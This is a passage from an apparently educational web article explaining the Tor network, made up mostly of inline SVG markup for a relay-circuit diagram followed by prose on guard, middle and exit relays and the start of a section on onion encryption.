          d="m -228.29943,189.87983 h -114.8306 c -2.06335,0 -3.73222,1.67169 -3.73222,3.73343 v 33.93777 c 0,2.06174 1.66887,3.73222 3.73222,3.73222 h 114.831 c 2.06536,0 3.73262,-1.67048 3.73262,-3.73222 v -33.93536 c 0,-2.06415 -1.66766,-3.73584 -3.73302,-3.73584 z m -57.4143,29.54742 h -49.01236 v -19.60463 h 49.01236 v 19.60463 z m 57.4143,20.51836 h -114.8306 c -2.06335,0 -3.73222,1.67048 -3.73222,3.73222 v 33.93898 c 0,2.06294 1.66887,3.73463 3.73222,3.73463 h 114.831 c 2.06536,0 3.73262,-1.67169 3.73262,-3.73463 v -33.93898 c 0,-2.06174 -1.66766,-3.73222 -3.73302,-3.73222 z m -57.4143,29.04184 h -49.01236 v -19.60502 h 49.01236 v 19.60502 z m 57.4143,20.53889 h -114.8306 c -2.06335,0 -3.73222,1.67411 -3.73222,3.73584 v 33.93777 c 0,2.06134 1.66887,3.73102 3.73222,3.73102 h 114.831 c 2.06536,0 3.73262,-1.66928 3.73262,-3.73102 v -33.93777 c 0,-2.06173 -1.66766,-3.73584 -3.73302,-3.73584 z m -57.4143,30.50664 h -49.01236 v -19.60342 h 49.01236 v 19.60342 z m 25.89933,45.95518 h 29.29383 v 5.34836 h -29.24633 v 0.25078 c 0,3.3792 -2.73557,6.11437 -6.11035,6.11437 h -39.67859 c -3.37438,0 -6.11276,-2.73557 -6.11276,-6.11437 v -0.25078 h -29.24271 v -5.34836 h 29.29504 c 0.26083,-3.13648 2.85994,-5.60316 6.06083,-5.60316 h 12.17722 v -12.21988 c 0,-3.37478 2.73516,-6.11477 6.10994,-6.11477 h 3.05598 c 3.37518,0 6.11115,2.74039 6.11115,6.11477 V 360.385 h 12.22431 c 3.20249,0 5.79758,2.47151 6.06244,5.60316 z"
          inkscape:connector-curvature="0"
          style="fill:#ffffff" />
       <g
          id="g8414"
          transform="matrix(2.4669289,0,0,2.4669289,-885.8347,435.09715)"
          style="fill:#ffffff">
         <g
            id="g8370"
            style="fill:#ffffff">
    <g
      id="g8372"
      style="fill:#ffffff">
        <path
      id="path8374"
      d="m 97.265,71.261 c -0.093,-0.108 -0.23,-0.172 -0.374,-0.172 H 0.494 c -0.144,0 -0.28,0.063 -0.374,0.172 -0.094,0.108 -0.136,0.253 -0.115,0.396 0.014,0.09 1.468,9.016 12.753,9.016 h 71.869 c 11.284,0 12.738,-8.926 12.753,-9.016 0.02,-0.143 -0.022,-0.288 -0.115,-0.396 z m -41.323,6.286 h -14.5 v -3.334 h 14.5 v 3.334 z"
      inkscape:connector-curvature="0"
      style="fill:#ffffff" />

        <path
      id="path8376"
      d="m 10.507,67.619 h 76.37 c 1.104,0 2,-0.896 2,-2 V 18.713 c 0,-1.104 -0.896,-2 -2,-2 h -76.37 c -1.104,0 -2,0.896 -2,2 v 46.906 c 0,1.104 0.896,2 2,2 z m 5,-43.906 h 66.37 V 60.619 H 15.507 V 23.713 z"
      inkscape:connector-curvature="0"
      style="fill:#ffffff" />

    </g>

   </g>
         <g
            id="g8378"
            style="fill:#ffffff">
   </g>
         <g
            id="g8380"
            style="fill:#ffffff">
   </g>
         <g
            id="g8382"
            style="fill:#ffffff">
   </g>
         <g
            id="g8384"
            style="fill:#ffffff">
   </g>
         <g
            id="g8386"
            style="fill:#ffffff">
   </g>
         <g
            id="g8388"
            style="fill:#ffffff">
   </g>
         <g
            id="g8390"
            style="fill:#ffffff">
   </g>
         <g
            id="g8392"
            style="fill:#ffffff">
   </g>
         <g
            id="g8394"
            style="fill:#ffffff">
   </g>
         <g
            id="g8396"
            style="fill:#ffffff">
   </g>
         <g
            id="g8398"
            style="fill:#ffffff">
   </g>
         <g
            id="g8400"
            style="fill:#ffffff">
   </g>
         <g
            id="g8402"
            style="fill:#ffffff">
   </g>
         <g
            id="g8404"
            style="fill:#ffffff">
   </g>
         <g
            id="g8406"
            style="fill:#ffffff">
   </g>
       </g>
       <path
          id="path8222-9"
          d="m -234.01367,435.59412 h -114.8306 c -2.06335,0 -3.73222,1.67169 -3.73222,3.73343 v 33.93777 c 0,2.06174 1.66887,3.73222 3.73222,3.73222 h 114.831 c 2.06536,0 3.73262,-1.67048 3.73262,-3.73222 v -33.93536 c 0,-2.06415 -1.66766,-3.73584 -3.73302,-3.73584 z m -57.4143,29.54742 h -49.01236 v -19.60463 h 49.01236 v 19.60463 z m 57.4143,20.51836 h -114.8306 c -2.06335,0 -3.73222,1.67048 -3.73222,3.73222 v 33.93898 c 0,2.06294 1.66887,3.73463 3.73222,3.73463 h 114.831 c 2.06536,0 3.73262,-1.67169 3.73262,-3.73463 v -33.93898 c 0,-2.06174 -1.66766,-3.73222 -3.73302,-3.73222 z m -57.4143,29.04184 h -49.01236 v -19.60502 h 49.01236 v 19.60502 z m 57.4143,20.53889 h -114.8306 c -2.06335,0 -3.73222,1.67411 -3.73222,3.73584 v 33.93777 c 0,2.06134 1.66887,3.73102 3.73222,3.73102 h 114.831 c 2.06536,0 3.73262,-1.66928 3.73262,-3.73102 v -33.93777 c 0,-2.06173 -1.66766,-3.73584 -3.73302,-3.73584 z m -57.4143,30.50664 h -49.01236 v -19.60342 h 49.01236 v 19.60342 z m 25.89933,45.95518 h 29.29383 v 5.34836 h -29.24633 v 0.25078 c 0,3.3792 -2.73557,6.11437 -6.11035,6.11437 h -39.67859 c -3.37438,0 -6.11276,-2.73557 -6.11276,-6.11437 v -0.25078 h -29.24271 v -5.34836 h 29.29504 c 0.26083,-3.13648 2.85994,-5.60316 6.06083,-5.60316 h 12.17722 v -12.21988 c 0,-3.37478 2.73516,-6.11477 6.10994,-6.11477 h 3.05598 c 3.37518,0 6.11115,2.74039 6.11115,6.11477 v 12.21988 h 12.22431 c 3.20249,0 5.79758,2.47151 6.06244,5.60316 z"
          inkscape:connector-curvature="0"
          style="fill:#ffffff" />
       <path
          id="path8222-90"
          d="m -242.5851,692.73698 h -114.8306 c -2.06335,0 -3.73222,1.67169 -3.73222,3.73343 v 33.93777 c 0,2.06174 1.66887,3.73222 3.73222,3.73222 h 114.831 c 2.06536,0 3.73262,-1.67048 3.73262,-3.73222 v -33.93536 c 0,-2.06415 -1.66766,-3.73584 -3.73302,-3.73584 z m -57.4143,29.54742 h -49.01236 v -19.60463 h 49.01236 v 19.60463 z m 57.4143,20.51836 h -114.8306 c -2.06335,0 -3.73222,1.67048 -3.73222,3.73222 v 33.93898 c 0,2.06294 1.66887,3.73463 3.73222,3.73463 h 114.831 c 2.06536,0 3.73262,-1.67169 3.73262,-3.73463 v -33.93898 c 0,-2.06174 -1.66766,-3.73222 -3.73302,-3.73222 z m -57.4143,29.04184 h -49.01236 v -19.60502 h 49.01236 v 19.60502 z m 57.4143,20.53889 h -114.8306 c -2.06335,0 -3.73222,1.67411 -3.73222,3.73584 v 33.93777 c 0,2.06134 1.66887,3.73102 3.73222,3.73102 h 114.831 c 2.06536,0 3.73262,-1.66928 3.73262,-3.73102 v -33.93777 c 0,-2.06173 -1.66766,-3.73584 -3.73302,-3.73584 z m -57.4143,30.50664 h -49.01236 v -19.60342 h 49.01236 v 19.60342 z m 25.89933,45.95518 h 29.29383 v 5.34836 h -29.24633 v 0.25078 c 0,3.3792 -2.73557,6.11437 -6.11035,6.11437 h -39.67859 c -3.37438,0 -6.11276,-2.73557 -6.11276,-6.11437 v -0.25078 h -29.24271 v -5.34836 h 29.29504 c 0.26083,-3.13648 2.85994,-5.60316 6.06083,-5.60316 h 12.17722 v -12.21988 c 0,-3.37478 2.73516,-6.11477 6.10994,-6.11477 h 3.05598 c 3.37518,0 6.11115,2.74039 6.11115,6.11477 v 12.21988 h 12.22431 c 3.20249,0 5.79758,2.47151 6.06244,5.60316 z"
          inkscape:connector-curvature="0"
          style="fill:#ffffff" />
       <path
          id="path8222-90-7"
          d="M 191.70061,-44.405879 H 76.870013 c -2.063349,0 -3.732221,1.67169 -3.732221,3.733428 v 33.93777 c 0,2.061738 1.668872,3.7322207 3.732221,3.7322207 H 191.70101 c 2.06536,0 3.73262,-1.6704827 3.73262,-3.7322207 v -33.935354 c 0,-2.064154 -1.66766,-3.735844 -3.73302,-3.735844 z M 134.28632,-14.85846 H 85.27395 v -19.604625 h 49.01237 V -14.85846 z M 191.70061,5.6598986 H 76.870013 c -2.063349,0 -3.732221,1.6704828 -3.732221,3.7322208 V 43.331097 c 0,2.062945 1.668872,3.734636 3.732221,3.734636 H 191.70101 c 2.06536,0 3.73262,-1.671691 3.73262,-3.734636 V 9.3921194 c 0,-2.061738 -1.66766,-3.7322208 -3.73302,-3.7322208 z M 134.28632,34.701745 H 85.27395 V 15.096717 h 49.01237 v 19.605028 z m 57.41429,20.538887 H 76.870013 c -2.063349,0 -3.732221,1.674106 -3.732221,3.735844 v 33.93777 c 0,2.061335 1.668872,3.731013 3.732221,3.731013 H 191.70101 c 2.06536,0 3.73262,-1.669275 3.73262,-3.731013 v -33.93777 c 0,-2.061738 -1.66766,-3.735844 -3.73302,-3.735844 z M 134.28632,85.747271 H 85.27395 V 66.143853 h 49.01237 v 19.603418 z m 25.89932,45.955179 h 29.29383 v 5.34837 h -29.24633 v 0.25077 c 0,3.3792 -2.73557,6.11437 -6.11034,6.11437 h -39.6786 c -3.37437,0 -6.11276,-2.73557 -6.11276,-6.11437 v -0.25077 H 79.088736 v -5.34837 h 29.295034 c 0.26084,-3.13648 2.85995,-5.60316 6.06083,-5.60316 h 12.17722 v -12.21988 c 0,-3.37478 2.73516,-6.11477 6.10994,-6.11477 h 3.05598 c 3.37518,0 6.11115,2.74039 6.11115,6.11477 v 12.21988 h 12.22431 c 3.2025,0 5.79758,2.47151 6.06244,5.60316 z"
          inkscape:connector-curvature="0"
          style="fill:#ffffff" />
       <g
          style="fill:#ffffff"
          id="g8224-3-3"
          transform="matrix(0.40252597,0,0,0.40252597,40.374593,-44.405879)" />
       <g
          style="fill:#ffffff"
          id="g8226-0-4"
          transform="matrix(0.40252597,0,0,0.40252597,40.374593,-44.405879)" />
       <g
          style="fill:#ffffff"
          id="g8228-3-0"
          transform="matrix(0.40252597,0,0,0.40252597,40.374593,-44.405879)" />
       <g
          style="fill:#ffffff"
          id="g8230-50-8"
          transform="matrix(0.40252597,0,0,0.40252597,40.374593,-44.405879)" />
       <g
          style="fill:#ffffff"
          id="g8232-7-8"
          transform="matrix(0.40252597,0,0,0.40252597,40.374593,-44.405879)" />
       <g
          style="fill:#ffffff"
          id="g8234-6-1"
          transform="matrix(0.40252597,0,0,0.40252597,40.374593,-44.405879)" />
       <g
          style="fill:#ffffff"
          id="g8236-7-5"
          transform="matrix(0.40252597,0,0,0.40252597,40.374593,-44.405879)" />
       <g
          style="fill:#ffffff"
          id="g8238-83-2"
          transform="matrix(0.40252597,0,0,0.40252597,40.374593,-44.405879)" />
       <g
          style="fill:#ffffff"
          id="g8240-6-3"
          transform="matrix(0.40252597,0,0,0.40252597,40.374593,-44.405879)" />
       <g
          style="fill:#ffffff"
          id="g8242-4-2"
          transform="matrix(0.40252597,0,0,0.40252597,40.374593,-44.405879)" />
       <g
          style="fill:#ffffff"
          id="g8244-4-4"
          transform="matrix(0.40252597,0,0,0.40252597,40.374593,-44.405879)" />
       <g
          style="fill:#ffffff"
          id="g8246-1-6"
          transform="matrix(0.40252597,0,0,0.40252597,40.374593,-44.405879)" />
       <g
          style="fill:#ffffff"
          id="g8248-9-6"
          transform="matrix(0.40252597,0,0,0.40252597,40.374593,-44.405879)" />
       <g
          style="fill:#ffffff"
          id="g8250-5-6"
          transform="matrix(0.40252597,0,0,0.40252597,40.374593,-44.405879)" />
       <g
          style="fill:#ffffff"
          id="g8252-5-2"
          transform="matrix(0.40252597,0,0,0.40252597,40.374593,-44.405879)" />
       <path
          id="path8222-90-4"
          d="M 183.12918,244.16555 H 68.298585 c -2.063349,0 -3.732221,1.67169 -3.732221,3.73343 v 33.93777 c 0,2.06174 1.668872,3.73222 3.732221,3.73222 H 183.12958 c 2.06536,0 3.73263,-1.67048 3.73263,-3.73222 v -33.93536 c 0,-2.06415 -1.66767,-3.73584 -3.73303,-3.73584 z m -57.41429,29.54742 H 76.702522 v -19.60463 h 49.012368 v 19.60463 z m 57.41429,20.51836 H 68.298585 c -2.063349,0 -3.732221,1.67048 -3.732221,3.73222 v 33.93898 c 0,2.06294 1.668872,3.73463 3.732221,3.73463 H 183.12958 c 2.06536,0 3.73263,-1.67169 3.73263,-3.73463 v -33.93898 c 0,-2.06174 -1.66767,-3.73222 -3.73303,-3.73222 z m -57.41429,29.04184 H 76.702522 v -19.60502 h 49.012368 v 19.60502 z m 57.41429,20.53889 H 68.298585 c -2.063349,0 -3.732221,1.67411 -3.732221,3.73584 v 33.93777 c 0,2.06134 1.668872,3.73102 3.732221,3.73102 H 183.12958 c 2.06536,0 3.73263,-1.66928 3.73263,-3.73102 V 347.5479 c 0,-2.06173 -1.66767,-3.73584 -3.73303,-3.73584 z M 125.71489,374.3187 H 76.702522 v -19.60342 h 49.012368 v 19.60342 z m 25.89932,45.95518 h 29.29383 v 5.34836 h -29.24633 v 0.25078 c 0,3.3792 -2.73556,6.11437 -6.11034,6.11437 h -39.6786 c -3.37437,0 -6.112756,-2.73557 -6.112756,-6.11437 v -0.25078 H 70.517308 v -5.34836 h 29.295035 c 0.260837,-3.13648 2.859947,-5.60316 6.060837,-5.60316 h 12.17721 v -12.21988 c 0,-3.37478 2.73517,-6.11477 6.10994,-6.11477 h 3.05598 c 3.37518,0 6.11115,2.74039 6.11115,6.11477 v 12.21988 h 12.22431 c 3.2025,0 5.79758,2.47151 6.06244,5.60316 z"
          inkscape:connector-curvature="0"
          style="fill:#ffffff" />
       <path
          id="path8222-90-3"
          d="M 174.55775,549.87984 H 59.727153 c -2.063349,0 -3.732221,1.67169 -3.732221,3.73343 v 33.93777 c 0,2.06174 1.668872,3.73222 3.732221,3.73222 H 174.55815 c 2.06536,0 3.73262,-1.67048 3.73262,-3.73222 v -33.93536 c 0,-2.06415 -1.66766,-3.73584 -3.73302,-3.73584 z m -57.41429,29.54742 H 68.13109 v -19.60463 h 49.01237 v 19.60463 z m 57.41429,20.51836 H 59.727153 c -2.063349,0 -3.732221,1.67048 -3.732221,3.73222 v 33.93898 c 0,2.06294 1.668872,3.73463 3.732221,3.73463 H 174.55815 c 2.06536,0 3.73262,-1.67169 3.73262,-3.73463 v -33.93898 c 0,-2.06174 -1.66766,-3.73222 -3.73302,-3.73222 z m -57.41429,29.04184 H 68.13109 v -19.60502 h 49.01237 v 19.60502 z m 57.41429,20.53889 H 59.727153 c -2.063349,0 -3.732221,1.67411 -3.732221,3.73584 v 33.93777 c 0,2.06134 1.668872,3.73102 3.732221,3.73102 H 174.55815 c 2.06536,0 3.73262,-1.66928 3.73262,-3.73102 v -33.93777 c 0,-2.06173 -1.66766,-3.73584 -3.73302,-3.73584 z m -57.41429,30.50664 H 68.13109 v -19.60342 h 49.01237 v 19.60342 z m 25.89932,45.95518 h 29.29383 v 5.34836 h -29.24633 v 0.25078 c 0,3.3792 -2.73557,6.11437 -6.11034,6.11437 H 97.301342 c -3.374375,0 -6.11276,-2.73557 -6.11276,-6.11437 v -0.25078 H 61.945876 v -5.34836 h 29.295035 c 0.260837,-3.13648 2.859947,-5.60316 6.060833,-5.60316 h 12.177216 v -12.21988 c 0,-3.37478 2.73516,-6.11477 6.10994,-6.11477 h 3.05598 c 3.37518,0 6.11115,2.74039 6.11115,6.11477 v 12.21988 h 12.22431 c 3.2025,0 5.79758,2.47151 6.06244,5.60316 z"
          inkscape:connector-curvature="0"
          style="fill:#ffffff" />
       <path
          id="path8222-90-39"
          d="M 183.12918,889.87983 H 68.298584 c -2.063349,0 -3.732221,1.67169 -3.732221,3.73343 v 33.93777 c 0,2.06174 1.668872,3.73222 3.732221,3.73222 H 183.12958 c 2.06536,0 3.73263,-1.67048 3.73263,-3.73222 v -33.93536 c 0,-2.06415 -1.66767,-3.73584 -3.73303,-3.73584 z m -57.41429,29.54742 H 76.702521 v -19.60463 h 49.012369 v 19.60463 z m 57.41429,20.51836 H 68.298584 c -2.063349,0 -3.732221,1.67048 -3.732221,3.73222 v 33.93898 c 0,2.06294 1.668872,3.73463 3.732221,3.73463 H 183.12958 c 2.06536,0 3.73263,-1.67169 3.73263,-3.73463 v -33.93898 c 0,-2.06174 -1.66767,-3.73222 -3.73303,-3.73222 z m -57.41429,29.04184 H 76.702521 v -19.60502 h 49.012369 v 19.60502 z m 57.41429,20.53889 H 68.298584 c -2.063349,0 -3.732221,1.67411 -3.732221,3.73584 V 1027.2 c 0,2.0613 1.668872,3.731 3.732221,3.731 H 183.12958 c 2.06536,0 3.73263,-1.6693 3.73263,-3.731 v -33.93782 c 0,-2.06173 -1.66767,-3.73584 -3.73303,-3.73584 z M 125.71489,1020.033 H 76.702521 v -19.6034 h 49.012369 v 19.6034 z m 25.89932,45.9552 h 29.29383 v 5.3483 h -29.24633 v 0.2508 c 0,3.3792 -2.73556,6.1144 -6.11034,6.1144 h -39.6786 c -3.37437,0 -6.112757,-2.7356 -6.112757,-6.1144 v -0.2508 H 70.517307 v -5.3483 h 29.295035 c 0.260838,-3.1365 2.859948,-5.6032 6.060838,-5.6032 h 12.17721 v -12.2199 c 0,-3.3748 2.73516,-6.1148 6.10994,-6.1148 h 3.05598 c 3.37518,0 6.11115,2.7404 6.11115,6.1148 v 12.2199 h 12.22431 c 3.2025,0 5.79758,2.4715 6.06244,5.6032 z"
          inkscape:connector-curvature="0"
          style="fill:#ffffff" />
       <path
          id="path8222-90-38"
          d="m 603.12919,138.45126 h -114.8306 c -2.06335,0 -3.73222,1.67169 -3.73222,3.73343 v 33.93777 c 0,2.06174 1.66887,3.73222 3.73222,3.73222 h 114.831 c 2.06536,0 3.73262,-1.67048 3.73262,-3.73222 V 142.1871 c 0,-2.06415 -1.66766,-3.73584 -3.73302,-3.73584 z m -57.4143,29.54742 h -49.01236 v -19.60463 h 49.01236 v 19.60463 z m 57.4143,20.51836 h -114.8306 c -2.06335,0 -3.73222,1.67048 -3.73222,3.73222 v 33.93898 c 0,2.06294 1.66887,3.73463 3.73222,3.73463 h 114.831 c 2.06536,0 3.73262,-1.67169 3.73262,-3.73463 v -33.93898 c 0,-2.06174 -1.66766,-3.73222 -3.73302,-3.73222 z m -57.4143,29.04184 h -49.01236 v -19.60502 h 49.01236 v 19.60502 z m 57.4143,20.53889 h -114.8306 c -2.06335,0 -3.73222,1.67411 -3.73222,3.73584 v 33.93777 c 0,2.06134 1.66887,3.73102 3.73222,3.73102 h 114.831 c 2.06536,0 3.73262,-1.66928 3.73262,-3.73102 v -33.93777 c 0,-2.06173 -1.66766,-3.73584 -3.73302,-3.73584 z m -57.4143,30.50664 h -49.01236 v -19.60342 h 49.01236 v 19.60342 z m 25.89933,45.95518 h 29.29383 v 5.34836 h -29.24633 v 0.25078 c 0,3.3792 -2.73557,6.11437 -6.11035,6.11437 h -39.67859 c -3.37438,0 -6.11276,-2.73557 -6.11276,-6.11437 v -0.25078 h -29.24271 v -5.34836 h 29.29504 c 0.26083,-3.13648 2.85994,-5.60316 6.06083,-5.60316 h 12.17722 v -12.21988 c 0,-3.37478 2.73516,-6.11477 6.10994,-6.11477 h 3.05598 c 3.37518,0 6.11115,2.74039 6.11115,6.11477 v 12.21988 h 12.22431 c 3.20249,0 5.79758,2.47151 6.06244,5.60316 z"
          inkscape:connector-curvature="0"
          style="fill:#ffffff" />
       <path
          id="path8222-90-8"
          d="m 603.12919,404.16555 h -114.8306 c -2.06335,0 -3.73222,1.67169 -3.73222,3.73343 v 33.93777 c 0,2.06174 1.66887,3.73222 3.73222,3.73222 h 114.831 c 2.06536,0 3.73262,-1.67048 3.73262,-3.73222 v -33.93536 c 0,-2.06415 -1.66766,-3.73584 -3.73302,-3.73584 z m -57.4143,29.54742 h -49.01236 v -19.60463 h 49.01236 v 19.60463 z m 57.4143,20.51836 h -114.8306 c -2.06335,0 -3.73222,1.67048 -3.73222,3.73222 v 33.93898 c 0,2.06294 1.66887,3.73463 3.73222,3.73463 h 114.831 c 2.06536,0 3.73262,-1.67169 3.73262,-3.73463 v -33.93898 c 0,-2.06174 -1.66766,-3.73222 -3.73302,-3.73222 z m -57.4143,29.04184 h -49.01236 v -19.60502 h 49.01236 v 19.60502 z m 57.4143,20.53889 h -114.8306 c -2.06335,0 -3.73222,1.67411 -3.73222,3.73584 v 33.93777 c 0,2.06134 1.66887,3.73102 3.73222,3.73102 h 114.831 c 2.06536,0 3.73262,-1.66928 3.73262,-3.73102 V 507.5479 c 0,-2.06173 -1.66766,-3.73584 -3.73302,-3.73584 z m -57.4143,30.50664 h -49.01236 v -19.60342 h 49.01236 v 19.60342 z m 25.89933,45.95518 h 29.29383 v 5.34836 h -29.24633 v 0.25078 c 0,3.3792 -2.73557,6.11437 -6.11035,6.11437 h -39.67859 c -3.37438,0 -6.11276,-2.73557 -6.11276,-6.11437 v -0.25078 h -29.24271 v -5.34836 h 29.29504 c 0.26083,-3.13648 2.85994,-5.60316 6.06083,-5.60316 h 12.17722 v -12.21988 c 0,-3.37478 2.73516,-6.11477 6.10994,-6.11477 h 3.05598 c 3.37518,0 6.11115,2.74039 6.11115,6.11477 v 12.21988 h 12.22431 c 3.20249,0 5.79758,2.47151 6.06244,5.60316 z"
          inkscape:connector-curvature="0"
          style="fill:#ffffff" />
       <path
          id="path8222-90-2"
          d="m 603.12919,675.59412 h -114.8306 c -2.06335,0 -3.73222,1.67169 -3.73222,3.73343 v 33.93777 c 0,2.06174 1.66887,3.73222 3.73222,3.73222 h 114.831 c 2.06536,0 3.73262,-1.67048 3.73262,-3.73222 v -33.93536 c 0,-2.06415 -1.66766,-3.73584 -3.73302,-3.73584 z m -57.4143,29.54742 h -49.01236 v -19.60463 h 49.01236 v 19.60463 z m 57.4143,20.51836 h -114.8306 c -2.06335,0 -3.73222,1.67048 -3.73222,3.73222 v 33.93898 c 0,2.06294 1.66887,3.73463 3.73222,3.73463 h 114.831 c 2.06536,0 3.73262,-1.67169 3.73262,-3.73463 v -33.93898 c 0,-2.06174 -1.66766,-3.73222 -3.73302,-3.73222 z m -57.4143,29.04184 h -49.01236 v -19.60502 h 49.01236 v 19.60502 z m 57.4143,20.53889 h -114.8306 c -2.06335,0 -3.73222,1.67411 -3.73222,3.73584 v 33.93777 c 0,2.06134 1.66887,3.73102 3.73222,3.73102 h 114.831 c 2.06536,0 3.73262,-1.66928 3.73262,-3.73102 v -33.93777 c 0,-2.06173 -1.66766,-3.73584 -3.73302,-3.73584 z m -57.4143,30.50664 h -49.01236 v -19.60342 h 49.01236 v 19.60342 z m 25.89933,45.95518 h 29.29383 v 5.34836 h -29.24633 v 0.25078 c 0,3.3792 -2.73557,6.11437 -6.11035,6.11437 h -39.67859 c -3.37438,0 -6.11276,-2.73557 -6.11276,-6.11437 v -0.25078 h -29.24271 v -5.34836 h 29.29504 c 0.26083,-3.13648 2.85994,-5.60316 6.06083,-5.60316 h 12.17722 v -12.21988 c 0,-3.37478 2.73516,-6.11477 6.10994,-6.11477 h 3.05598 c 3.37518,0 6.11115,2.74039 6.11115,6.11477 v 12.21988 h 12.22431 c 3.20249,0 5.79758,2.47151 6.06244,5.60316 z"
          inkscape:connector-curvature="0"
          style="fill:#ffffff" />
       <path
          style="fill:none;stroke:#ffffff;stroke-width:5;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none"
          d="M -605.71457,586.64818 -339.19506,367.78404"
          id="path8901"
          inkscape:connector-curvature="0" />
       <path
          style="fill:none;stroke:#ffffff;stroke-width:5;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none"
          d="M -232.62393,367.1089 72.821982,1070.2735"
          id="path8903"
          inkscape:connector-curvature="0" />
       <path
          style="fill:none;stroke:#ffffff;stroke-width:5;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none"
          d="M 178.42094,1070.3735 492.84919,315.40803"
          id="path8905"
          inkscape:connector-curvature="0" />
       <path
          style="fill:none;stroke:#ffffff;stroke-width:5;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none"
          d="M 598.64615,315.96501 814.29764,589.51697"
          id="path8907"
          inkscape:connector-curvature="0" />
       <text
          xml:space="preserve"
          style="font-size:40px;font-style:normal;font-weight:normal;line-height:125%;letter-spacing:0px;word-spacing:0px;fill:#ffffff;fill-opacity:1;stroke:none;font-family:Segoe UI;-inkscape-font-specification:Segoe UI;font-stretch:normal;font-variant:normal"
          x="-840.00891"
          y="1171.5078"
          id="text9491"
          sodipodi:linespacing="125%"><tspan
            sodipodi:role="line"
            x="-840.00891"
            y="1171.5078"
            id="tspan9493"><tspan
              x="-840.00891"
              y="1171.5078"
              id="tspan9495"
              style="-inkscape-font-specification:Segoe UI;font-family:Segoe UI;font-weight:normal;font-style:normal;font-stretch:normal;font-variant:normal;fill:#ffffff">Client</tspan></tspan></text>
       <text
          xml:space="preserve"
          style="font-size:40px;font-style:normal;font-weight:normal;line-height:125%;letter-spacing:0px;word-spacing:0px;fill:#ffffff;fill-opacity:1;stroke:none;font-family:Segoe UI;-inkscape-font-specification:Segoe UI;font-stretch:normal;font-variant:normal"
          x="-411.45981"
          y="1177.25"
          id="text9497"
          sodipodi:linespacing="125%"><tspan
            sodipodi:role="line"
            x="-411.45981"
            y="1177.25"
            id="tspan9499"><tspan
              x="-411.45981"
              y="1177.25"
              id="tspan9501"
              style="-inkscape-font-specification:Segoe UI;font-family:Segoe UI;font-weight:normal;font-style:normal;font-stretch:normal;font-variant:normal;fill:#ffffff">Guard Relay</tspan></tspan></text>
       <text
          xml:space="preserve"
          style="font-size:40px;font-style:normal;font-weight:normal;line-height:125%;letter-spacing:0px;word-spacing:0px;fill:#ffffff;fill-opacity:1;stroke:none;font-family:Segoe UI;-inkscape-font-specification:Segoe UI;font-stretch:normal;font-variant:normal"
          x="2.2544701"
          y="1178.1072"
          id="text9503"
          sodipodi:linespacing="125%"><tspan
            sodipodi:role="line"
            x="2.2544701"
            y="1178.1072"
            id="tspan9505"><tspan
              x="2.2544701"
              y="1178.1072"
              id="tspan9507"
              style="-inkscape-font-specification:Segoe UI;font-family:Segoe UI;font-weight:normal;font-style:normal;font-stretch:normal;font-variant:normal;fill:#ffffff">Middle Relay</tspan></tspan></text>
       <text
          xml:space="preserve"
          style="font-size:40px;font-style:normal;font-weight:normal;line-height:125%;letter-spacing:0px;word-spacing:0px;fill:#ffffff;fill-opacity:1;stroke:none;font-family:Segoe UI;-inkscape-font-specification:Segoe UI;font-stretch:normal;font-variant:normal"
          x="462.25449"
          y="1183.8215"
          id="text9509"
          sodipodi:linespacing="125%"><tspan
            sodipodi:role="line"
            x="462.25449"
            y="1183.8215"
            id="tspan9511"><tspan
              x="462.25449"
              y="1183.8215"
              id="tspan9513"
              style="-inkscape-font-specification:Segoe UI;font-family:Segoe UI;font-weight:normal;font-style:normal;font-stretch:normal;font-variant:normal;fill:#ffffff">Exit Relay</tspan></tspan></text>
       <text
          xml:space="preserve"
          style="font-size:40px;font-style:normal;font-weight:normal;line-height:125%;letter-spacing:0px;word-spacing:0px;fill:#ffffff;fill-opacity:1;stroke:none;font-family:Segoe UI;-inkscape-font-specification:Segoe UI;font-stretch:normal;font-variant:normal"
          x="856.54022"
          y="1189.5358"
          id="text9515"
          sodipodi:linespacing="125%"><tspan
            sodipodi:role="line"
            x="856.54022"
            y="1189.5358"
            id="tspan9517"><tspan
              x="856.54022"
              y="1189.5358"
              id="tspan9519"
              style="-inkscape-font-specification:Segoe UI;font-family:Segoe UI;font-weight:normal;font-style:normal;font-stretch:normal;font-variant:normal;fill:#ffffff">Desination</tspan></tspan></text>
     </g>
   </svg>
</div>


<br/>


<ul>
<li><p><strong>Entry/Guard Relay</strong> &ndash; This is the entry point to the Tor network. Relays are selected to serve as guard relays after being around for a while, as well as having shown to be stable and having high bandwidth.<sup><a href="https://blog.torproject.org/blog/lifecycle-of-a-new-relay">1</a></sup></p></li>
<li><p><strong>Middle Relay</strong> &ndash; Middle relays are exactly that &ndash; middle nodes used to transport traffic from the guard relay to the exit relay. This prevents the guard and exit relay from knowing each other.</p></li>
<li><p><strong>Exit Relay</strong> &ndash; These relays are the exit point at the edge of the Tor network. These relays send traffic to the final destination intended by the client.</p></li>
</ul>


<p>Generally, it is safe to run a guard or middle relay on any VPS or shared server (such as  <a href="https://www.digitalocean.com/?refcode=2895d5b6c219">DigitalOcean</a> or <a href="https://aws.amazon.com/ec2/">EC2</a>), since all the server operators will see is harmless encrypted traffic (more on this later).</p>

<p>However, there are <a href="https://blog.torproject.org/blog/tips-running-exit-node-minimal-harassment">special responsibilities</a> to consider when running an exit node. Since exit relays send traffic directly to the end destination, any illicit activity done through Tor appears to come from the exit relay. This leads to the rare possibility of raids, abuse notices, or more.</p>

<p>If you meet an exit relay operator &ndash; thank them. <strong>They deserve it.</strong></p>

<h3>Why Onions?</h3>

<p>Now that we know how connections are routed through relays, how do we know we can actually <em>trust</em> relays? How can we be sure relays won&rsquo;t track who we&rsquo;re connecting to and sniff the data we send across the wire? The short answer is, <em>we don&rsquo;t have to!</em>.</p>

<p>Tor is designed to put as little trust in relays as possible. It does this through the use of <strong>encryption</strong>.</p>

<p>So what&rsquo;s the deal with all the references to onions? To answer this question, let&rsquo;s take a high-level look at how the encryption works when a client makes a connection through the Tor network.</p>

<p><span class="fa-stack fa-lg fa-1x">
<i class="fa fa-circle fa-stack-2x" style="color:#3498DB"></i>
<i class="fa fa-stack-1x" style="color:white; font-family:inherit;">1</i>
</span>
